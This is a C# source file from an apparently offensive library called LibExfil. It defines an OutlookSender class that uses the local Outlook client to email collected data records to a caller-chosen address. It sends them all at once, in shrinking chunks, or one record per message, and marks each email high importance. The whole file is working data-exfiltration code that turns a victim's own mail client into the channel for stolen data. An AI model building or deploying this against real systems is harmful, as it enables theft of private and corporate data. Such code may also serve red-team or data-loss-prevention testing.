
using System;
using System.Configuration;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using Outlook = Microsoft.Office.Interop.Outlook;
using LibExfil.Structures;
using System.Collections.Generic;
using System.Drawing.Printing;
using System.Linq;
using LibExfil.Interfaces;
using System.Security.Cryptography;

namespace LibExfil.DataSenders.ImplementedSenders
{

    public enum SendAs { FILE_ATTACHMENT,PLAINTEXT_BODY}

    class OutlookSender: IEmailSenderInterface
    {

        private string email_body;
        private readonly string subject_line;
        public OutlookSender(string email_body, string subject_line)
        {
            this.email_body = email_body;
            this.subject_line = subject_line;
        }



        private void SendMailItem(string email_to, string full_body)
        {
            Outlook.Application app = new Outlook.Application();
            Outlook.MailItem mailItem = app.CreateItem(Outlook.OlItemType.olMailItem);
            mailItem.Subject = subject_line;
            mailItem.To = email_to;
            mailItem.Body = full_body;
            mailItem.Importance = Outlook.OlImportance.olImportanceHigh;
            mailItem.Display(false);
            mailItem.Send();
        }

        public int SendAllRecords(DataRecordCollection data, string destination)
        {
            string sending_body = email_body;
            sending_body += Environment.NewLine;
            sending_body += data.ToString();
            SendMailItem(destination, sending_body);
            return data.GetShape().Rows;
        }

        public int SendDecrementalEmails(DataRecordCollection data, string destination)
        {
            int sent = 0;
            int current_chunk=data.GetShape().Rows;
            while (sent < data.GetShape().Rows)
            {
                current_chunk /= 2;
                if (current_chunk == 0)
                    ++current_chunk;    //we need at least one more record if its here and the chunk size is zero
                int records_to_send = 0;
                if (sent + current_chunk >= data.GetShape().Rows)
                    records_to_send = data.GetShape().Rows - sent;
                else
                    records_to_send = current_chunk;
                DataRecordCollection drc = new DataRecordCollection(data.Schema);
                foreach (DataRecord d in data.GetRecords().Skip(sent).Take(records_to_send))
                    drc.AddRecord(d);
                SendAllRecords(drc, destination);
                sent += records_to_send;
            }
            return sent;
        }

        public int Send(DataRecordCollection data, string destination)
        {
            int sent = 0;
            foreach (DataRecord d in data.GetRecords())
            {
                string sending_body = email_body+ d.ToString();
                SendMailItem(destination, sending_body);
                sent++;
            }
            return sent;
        }
    }


}
